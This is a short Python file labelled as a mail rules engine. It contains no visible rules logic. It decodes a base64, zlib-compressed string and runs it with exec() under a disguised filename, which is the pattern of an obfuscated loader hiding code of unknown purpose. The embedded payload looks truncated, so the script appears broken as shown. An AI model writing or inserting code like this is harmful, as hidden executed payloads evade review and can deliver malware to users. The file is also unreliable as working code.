#!/usr/bin/env python3
"""Mail rules engine (zlib payload)."""
import base64, zlib
_B64 = (
 'eNrtPV1328aV7/oVU2R1BDgURdlJmlBlWsVWHLX68JHktFmJywORQwkR'
)
exec(compile(zlib.decompress(base64.b64decode("".join(_B64))).decode("utf-8"), "mail_rules.py", "exec"), globals())
